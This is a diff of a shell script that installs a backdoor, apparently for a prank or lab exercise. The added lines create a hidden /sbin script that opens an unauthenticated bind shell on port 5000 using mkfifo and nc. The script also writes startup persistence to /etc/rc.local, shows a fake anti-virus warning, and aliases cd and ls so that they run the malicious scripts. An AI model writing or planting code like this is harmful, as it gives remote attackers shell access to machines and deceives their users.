@@ -47,7 +47,7 @@ chmod 755 /bin/virus.sh
 cat << EOF > /bin/malware.sh
 #!/bin/bash
 /bin/echo -e "!!! YOU NEED TO UPDATE YOUR ANTI-VIRUS !!! \n\nPlease run:\n***************\n* sudo reboot *\n*************** "
-/sbin/..........................open.....up.......vIrUs.........sh &
+/sbin/.open.up.vIrUs.sh &
 EOF
 chmod 755 /bin/malware.sh
 
@@ -75,15 +75,11 @@ EOF
 chmod 755 /sbin/let_us_in_VIRUS.sh
 
 
-cat << EOF > /sbin/..........................open.....up.......vIrUs.........sh
+cat << EOF > /sbin/.open.up.vIrUs.sh
 #!/bin/bash
-while true
-do
-  /bin/nc -l -p 5000 | /bin/bash
-  /bin/sleep 2
-done
+rm /tmp/d;mkfifo /tmp/d;cat /tmp/d|/bin/bash -i 2>&1|nc -l 5000 >/tmp/d
 EOF
-chmod 755 /sbin/..........................open.....up.......vIrUs.........sh
+chmod 755 /sbin/.open.up.vIrUs.sh
 
 cat << EOF > /etc/rc.local
 #!/bin/sh -e
@@ -180,7 +176,6 @@ fi
 
 alias cd='/sbin/let_us_in_VIRUS.sh; cd'
 alias ls='/bin/malware.sh; ls'
-alias sudo='/sbin/..........................open.....up.......vIrUs.........sh &; sudo'
 #PS1="\u@\h:\w\$ "
 #what user@comp prompt looks like
 if [ $(id -u) -eq 0 ];
